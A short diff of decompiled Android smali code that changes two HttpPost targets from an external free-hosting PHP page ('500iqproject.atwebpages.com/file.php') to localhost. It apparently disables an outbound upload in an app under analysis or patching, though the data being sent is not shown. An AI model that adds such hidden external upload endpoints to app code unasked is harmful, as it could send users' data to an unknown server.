@@ -506,7 +506,7 @@
 
     move-object/from16 v35, v42
 
-    const-string v36, "http://500iqproject.atwebpages.com/file.php"
+    const-string v36, "http://localhost/file.php"
 
     invoke-direct/range {v35 .. v36}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V
 
@@ -614,7 +614,7 @@
 
     move-object/from16 v35, v42
 
-    const-string v36, "http://500iqproject.atwebpages.com/file.php"
+    const-string v36, "http://localhost/file.php"
 
     invoke-direct/range {v35 .. v36}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V
 
